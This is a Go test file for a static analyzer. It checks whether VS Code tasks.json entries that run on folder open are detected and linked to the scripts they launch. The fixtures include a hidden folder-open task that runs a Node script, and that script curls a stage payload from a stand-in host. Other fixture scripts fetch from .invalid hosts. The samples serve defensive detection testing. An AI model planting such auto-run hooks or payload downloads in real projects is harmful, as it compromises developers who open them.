package extract

import (
	"fmt"
	"reflect"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestRunModelsVSCodeFolderOpenTaskWithoutClaimingOccurrence(t *testing.T) {
	artifacts, contents, configID, targetID := projectConfigFixture(
		"checkout.tar.gz!keyv/.vscode/tasks.json",
		`{
			// JSONC is the native tasks.json format.
			"version": "2.0.0",
			"tasks": [{
				"label": "prepare workspace",
				"type": "shell",
				"command": "node .claude/setup.mjs",
				"runOptions": {"runOn": "folderOpen"},
			},],
		}`,
		"checkout.tar.gz!keyv/.claude/setup.mjs",
		"const { execSync } = require(\"child_process\");\nexecSync(\"curl https://payload.example.invalid/stage -o /tmp/stage\");\n",
	)
	graph := Run(Context{Artifacts: &artifacts, Contents: contents})

	if len(graph.ExecutionRoots) != 1 {
		t.Fatalf("execution roots = %#v, want one conditional folder-open task", graph.ExecutionRoots)
	}
	root := graph.ExecutionRoots[0]
	if root.Kind != vscodeTasksRootKind || root.DeclarationNodeID != configID || root.StartNodeID != "" || root.StartScopeID == "" || root.Name != "prepare workspace" || root.Interpreter != "" {
		t.Fatalf("folder-open root = %#v", root)
	}
	if len(root.EvidenceIDs) != 1 || !evidenceHasValue(graph.Evidence, root.EvidenceIDs[0], "runOn=folderOpen") {
		t.Fatalf("root lost exact declaration evidence: root=%#v evidence=%#v", root, graph.Evidence)
	}
	if !coverageContains(graph.Coverage, configID, vscodeTasksAnalysisArea, "trusted workspace") ||
		!coverageContains(graph.Coverage, configID, vscodeTasksAnalysisArea, "task.allowAutomaticTasks") ||
		!coverageContains(graph.Coverage, configID, vscodeTasksAnalysisArea, "concrete automation shell") {
		t.Fatalf("host gate is not explicit in coverage: %#v", graph.Coverage)
	}

	target := invokedTargetForNode(graph.InvokedTargets, targetID)
	if target == nil || target.Source.Kind != behavior.EntityKindExecutionRoot || target.Source.ID != root.ID || target.Execution.Connectivity != behavior.ConnectivityConnected {
		t.Fatalf("exact project target was not connected to the conditional root: %#v", graph.InvokedTargets)
	}
	if !hasConnectedOperationForNode(graph.Operations, configID, root.ID, behavior.OperationInterpreterInvoke) {
		t.Fatalf("task command was not modeled in its root scope: %#v", graph.Operations)
	}
	if !hasConnectedTargetOperation(graph.Operations, targetID, root.ID, target.ID, behavior.OperationNetworkDownload) {
		t.Fatalf("target semantics were not promoted through the exact invocation: %#v", graph.Operations)
	}
	if err := graph.Sort(); err != nil {
		t.Fatalf("project-task graph has invalid references: %v", err)
	}
}

func TestRunResolvesVSCodeWorkspaceFolderTargetInsideProject(t *testing.T) {
	artifacts, contents, _, targetID := projectConfigFixture(
		"sample/.vscode/tasks.json",
		`{"tasks":[{"label":"prepare","type":"process","command":"node","args":["${workspaceFolder}/scripts/start.mjs"],"runOptions":{"runOn":"folderOpen"}}]}`,
		"sample/scripts/start.mjs",
		"fetch('https://payload.example.invalid/p');\n",
	)
	graph := Run(Context{Artifacts: &artifacts, Contents: contents})
	if len(graph.ExecutionRoots) != 1 || invokedTargetForNode(graph.InvokedTargets, targetID) == nil {
		t.Fatalf("bounded workspaceFolder target was not resolved: roots=%#v targets=%#v", graph.ExecutionRoots, graph.InvokedTargets)
	}
	if err := graph.Sort(); err != nil {
		t.Fatalf("workspaceFolder graph has invalid references: %v", err)
	}
}

func TestRunVSCodeFolderOpenTaskCloseNegativesFailClosed(t *testing.T) {
	tests := []struct {
		name          string
		manifest      string
		targetLogical string
		wantRoot      bool
		wantPartial   string
		wantNoTargets bool
	}{
		{
			name:     "ordinary task",
			manifest: `{"tasks":[{"label":"manual","type":"shell","command":"bash scripts/start.sh","runOptions":{"runOn":"default"}}]}`,
			wantRoot: false,
		},
		{
			name:          "path escape",
			manifest:      `{"tasks":[{"label":"escape","type":"shell","command":"bash ../outside.sh","runOptions":{"runOn":"folderOpen"}}]}`,
			targetLogical: "sample/outside.sh",
			wantRoot:      true,
			wantNoTargets: true,
		},
		{
			name:        "unsupported provider task",
			manifest:    `{"tasks":[{"label":"npm","type":"npm","script":"prepare","runOptions":{"runOn":"folderOpen"}}]}`,
			wantRoot:    false,
			wantPartial: "type \"npm\" is not modeled",
		},
		{
			name:        "mac override",
			manifest:    `{"tasks":[{"label":"override","type":"shell","command":"echo base","osx":{"command":"bash scripts/start.sh"},"runOptions":{"runOn":"folderOpen"}}]}`,
			wantRoot:    false,
			wantPartial: "macOS-specific task override",
		},
		{
			name:        "working directory override",
			manifest:    `{"tasks":[{"label":"cwd","type":"process","command":"./start.sh","options":{"cwd":"subdir"},"runOptions":{"runOn":"folderOpen"}}]}`,
			wantRoot:    false,
			wantPartial: "working-directory override",
		},
		{
			name:        "task dependency graph",
			manifest:    `{"tasks":[{"label":"dependent","type":"shell","command":"bash scripts/start.sh","dependsOn":"prepare","runOptions":{"runOn":"folderOpen"}}]}`,
			wantRoot:    false,
			wantPartial: "dependency graph is present",
		},
		{
			name:        "environment override",
			manifest:    `{"tasks":[{"label":"environment","type":"shell","command":"bash scripts/start.sh","options":{"env":{"PATH":"/tmp"}},"runOptions":{"runOn":"folderOpen"}}]}`,
			wantRoot:    false,
			wantPartial: "environment override is present",
		},
		{
			name:        "top-level mac override",
			manifest:    `{"osx":{"options":{"cwd":"other"}},"tasks":[{"label":"override","type":"shell","command":"bash scripts/start.sh","runOptions":{"runOn":"folderOpen"}}]}`,
			wantRoot:    false,
			wantPartial: "top-level macOS-specific task configuration",
		},
		{
			name:        "top-level working directory override",
			manifest:    `{"options":{"cwd":"subdir"},"tasks":[{"label":"override","type":"shell","command":"bash scripts/start.sh","runOptions":{"runOn":"folderOpen"}}]}`,
			wantRoot:    false,
			wantPartial: "top-level task cwd override",
		},
		{
			name:        "unresolved variable",
			manifest:    `{"tasks":[{"label":"variable","type":"process","command":"node","args":["${env:ENTRY}"],"runOptions":{"runOn":"folderOpen"}}]}`,
			wantRoot:    false,
			wantPartial: "outside the bounded ${workspaceFolder} form",
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			targetLogical := test.targetLogical
			if targetLogical == "" {
				targetLogical = "sample/scripts/start.sh"
			}
			artifacts, contents, configID, _ := projectConfigFixture("sample/.vscode/tasks.json", test.manifest, targetLogical, "curl https://should-not-connect.invalid/p\n")
			graph := Run(Context{Artifacts: &artifacts, Contents: contents})
			gotRoot := false
			for _, root := range graph.ExecutionRoots {
				gotRoot = gotRoot || root.Kind == vscodeTasksRootKind
			}
			if gotRoot != test.wantRoot {
				t.Fatalf("folder-open root present = %v, want %v: %#v", gotRoot, test.wantRoot, graph.ExecutionRoots)
			}
			if test.wantPartial != "" && !coverageContains(graph.Coverage, configID, vscodeTasksAnalysisArea, test.wantPartial) {
				t.Fatalf("missing partial coverage %q: %#v", test.wantPartial, graph.Coverage)
			}
			if test.wantNoTargets && len(graph.InvokedTargets) != 0 {
				t.Fatalf("unsafe relative path gained a retained target: %#v", graph.InvokedTargets)
			}
		})
	}
}

func TestRunVSCodeFolderOpenTaskMalformedFormsEmitNoBehavior(t *testing.T) {
	tests := []struct {
		name     string
		manifest string
		detail   string
	}{
		{name: "malformed jsonc", manifest: `{"tasks":[/*`, detail: "unterminated block comment"},
		{name: "tasks object", manifest: `{"tasks":{}}`, detail: "tasks is not an array"},
		{name: "runOn nonstring", manifest: `{"tasks":[{"type":"shell","command":"bash scripts/start.sh","runOptions":{"runOn":true}}]}`, detail: "runOptions.runOn is not a string"},
		{name: "args object", manifest: `{"tasks":[{"type":"process","command":"bash","args":{},"runOptions":{"runOn":"folderOpen"}}]}`, detail: "task.args is not a string array"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			artifacts, contents, configID, _ := projectConfigFixture("sample/.vscode/tasks.json", test.manifest, "sample/scripts/start.sh", "curl https://should-not-connect.invalid/p\n")
			graph := Run(Context{Artifacts: &artifacts, Contents: contents})
			if len(graph.ExecutionRoots) != 0 || len(graph.InvokedTargets) != 0 || hasAnyConnectedOperation(graph.Operations) {
				t.Fatalf("malformed configuration produced behavior: roots=%#v targets=%#v operations=%#v", graph.ExecutionRoots, graph.InvokedTargets, graph.Operations)
			}
			if !coverageContains(graph.Coverage, configID, vscodeTasksAnalysisArea, test.detail) {
				t.Fatalf("malformed configuration lacks stable coverage %q: %#v", test.detail, graph.Coverage)
			}
		})
	}
}

func TestRunVSCodeTasksJSONCSanitizerIsInputBounded(t *testing.T) {
	settings := strings.Repeat(" ", maxStructuredDocumentBytes+1)
	artifacts, contents, configID, _ := projectConfigFixture("sample/.vscode/tasks.json", settings, "sample/scripts/start.sh", "")
	graph := Run(Context{Artifacts: &artifacts, Contents: contents})
	if len(graph.ExecutionRoots) != 0 || len(graph.InvokedTargets) != 0 || hasAnyConnectedOperation(graph.Operations) {
		t.Fatalf("oversized JSONC produced behavior: roots=%#v targets=%#v operations=%#v", graph.ExecutionRoots, graph.InvokedTargets, graph.Operations)
	}
	if !coverageContains(graph.Coverage, configID, vscodeTasksAnalysisArea, "parser input limit") {
		t.Fatalf("oversized JSONC lacks explicit bounded coverage: %#v", graph.Coverage)
	}
}

func TestRunVSCodeFolderOpenTaskRejectsAmbiguousRetainedTarget(t *testing.T) {
	var artifacts artifact.Graph
	rootID := artifacts.AddNode(artifact.Node{LogicalPath: "sample", Kind: "directory", AnalyzeStatus: "analyzed"})
	configID := artifacts.AddNode(artifact.Node{ParentID: rootID, LogicalPath: "sample/.vscode/tasks.json", Kind: "manifest", MediaType: "text/plain", SourceRole: "runtime", AnalyzeStatus: "analyzed"})
	firstTargetID := artifacts.AddNode(artifact.Node{ParentID: rootID, LogicalPath: "sample/scripts/start.sh", Kind: "script", MediaType: "text/plain", SourceRole: "runtime", AnalyzeStatus: "analyzed"})
	secondTargetID := artifacts.AddNode(artifact.Node{ParentID: rootID, LogicalPath: "sample/scripts/start.sh", Kind: "script", MediaType: "text/plain", SourceRole: "runtime", AnalyzeStatus: "analyzed"})
	contents := []artifact.Content{
		{NodeID: configID, LogicalPath: "sample/.vscode/tasks.json", Kind: "manifest", MediaType: "text/plain", Role: "runtime", Data: []byte(`{"tasks":[{"type":"shell","command":"bash scripts/start.sh","runOptions":{"runOn":"folderOpen"}}]}`)},
		{NodeID: firstTargetID, LogicalPath: "sample/scripts/start.sh", Kind: "script", MediaType: "text/plain", Role: "runtime", Data: []byte("curl https://first.invalid/p\n")},
		{NodeID: secondTargetID, LogicalPath: "sample/scripts/start.sh", Kind: "script", MediaType: "text/plain", Role: "runtime", Data: []byte("curl https://second.invalid/p\n")},
	}
	graph := Run(Context{Artifacts: &artifacts, Contents: contents})
	if len(graph.ExecutionRoots) != 1 || len(graph.InvokedTargets) != 0 {
		t.Fatalf("ambiguous target should retain only the conditional command root: roots=%#v targets=%#v", graph.ExecutionRoots, graph.InvokedTargets)
	}
	if !coverageContains(graph.Coverage, configID, vscodeTasksAnalysisArea, "absent or ambiguous") {
		t.Fatalf("ambiguous target is not explicit in coverage: %#v", graph.Coverage)
	}
}

func TestRunVSCodeFolderOpenTasksAreBoundedAndDeterministic(t *testing.T) {
	var tasks strings.Builder
	tasks.WriteString(`{"tasks":[`)
	for index := 0; index < maxProjectConfigCommands+1; index++ {
		if index > 0 {
			tasks.WriteByte(',')
		}
		fmt.Fprintf(&tasks, `{"label":"task-%03d","type":"process","command":"./scripts/task-%03d.sh","runOptions":{"runOn":"folderOpen"}}`, index, index)
	}
	tasks.WriteString(`]}`)

	artifacts, contents, configID, _ := projectConfigFixture("sample/.vscode/tasks.json", tasks.String(), "sample/scripts/unused.sh", "")
	first := Run(Context{Artifacts: &artifacts, Contents: contents})
	second := Run(Context{Artifacts: &artifacts, Contents: contents})
	if !reflect.DeepEqual(first, second) {
		t.Fatal("bounded folder-open task analysis is nondeterministic")
	}
	roots := 0
	for _, root := range first.ExecutionRoots {
		if root.Kind == vscodeTasksRootKind {
			roots++
		}
	}
	if roots != maxProjectConfigCommands {
		t.Fatalf("folder-open roots = %d, want bounded prefix %d", roots, maxProjectConfigCommands)
	}
	if !coverageContains(first.Coverage, configID, vscodeTasksAnalysisArea, fmt.Sprintf("task limit %d reached", maxProjectConfigCommands)) {
		t.Fatalf("cardinality limit is not explicit: %#v", first.Coverage)
	}
	if err := first.Sort(); err != nil {
		t.Fatalf("bounded project-task graph has invalid references: %v", err)
	}
}

func projectConfigFixture(configLogical, configData, targetLogical, targetData string) (artifact.Graph, []artifact.Content, string, string) {
	var artifacts artifact.Graph
	rootID := artifacts.AddNode(artifact.Node{LogicalPath: "sample", Kind: "directory", AnalyzeStatus: "analyzed"})
	configID := artifacts.AddNode(artifact.Node{ParentID: rootID, LogicalPath: configLogical, Kind: "manifest", MediaType: "text/plain", SourceRole: "runtime", AnalyzeStatus: "analyzed"})
	targetID := artifacts.AddNode(artifact.Node{ParentID: rootID, LogicalPath: targetLogical, Kind: "script", MediaType: "text/plain", SourceRole: "runtime", AnalyzeStatus: "analyzed"})
	contents := []artifact.Content{
		{NodeID: configID, LogicalPath: configLogical, Kind: "manifest", MediaType: "text/plain", Role: "runtime", Data: []byte(configData)},
		{NodeID: targetID, LogicalPath: targetLogical, Kind: "script", MediaType: "text/plain", Role: "runtime", Data: []byte(targetData)},
	}
	return artifacts, contents, configID, targetID
}

func evidenceHasValue(evidence []behavior.Evidence, id, fragment string) bool {
	for _, item := range evidence {
		if item.ID == id {
			return strings.Contains(item.Value, fragment)
		}
	}
	return false
}

func coverageContains(coverage []behavior.Coverage, nodeID, area, fragment string) bool {
	for _, item := range coverage {
		if item.NodeID == nodeID && item.AnalysisArea == area && strings.Contains(item.Detail, fragment) {
			return true
		}
	}
	return false
}

func invokedTargetForNode(targets []behavior.InvokedTarget, nodeID string) *behavior.InvokedTarget {
	for index := range targets {
		if targets[index].NodeID == nodeID {
			return &targets[index]
		}
	}
	return nil
}

func hasConnectedOperationForNode(operations []behavior.ModeledOperation, nodeID, rootID string, kind behavior.OperationKind) bool {
	for _, operation := range operations {
		if operation.SubjectNodeID == nodeID && operation.Kind == kind && operation.Execution.Connectivity == behavior.ConnectivityConnected && containsString(operation.Execution.ExecutionRootIDs, rootID) {
			return true
		}
	}
	return false
}

func hasConnectedTargetOperation(operations []behavior.ModeledOperation, nodeID, rootID, targetID string, kind behavior.OperationKind) bool {
	for _, operation := range operations {
		if operation.SubjectNodeID == nodeID && operation.Kind == kind && operation.Execution.Connectivity == behavior.ConnectivityConnected &&
			containsString(operation.Execution.ExecutionRootIDs, rootID) && containsString(operation.Execution.InvokedTargetIDs, targetID) {
			return true
		}
	}
	return false
}

func hasAnyConnectedOperation(operations []behavior.ModeledOperation) bool {
	for _, operation := range operations {
		if operation.Execution.Connectivity == behavior.ConnectivityConnected {
			return true
		}
	}
	return false
}
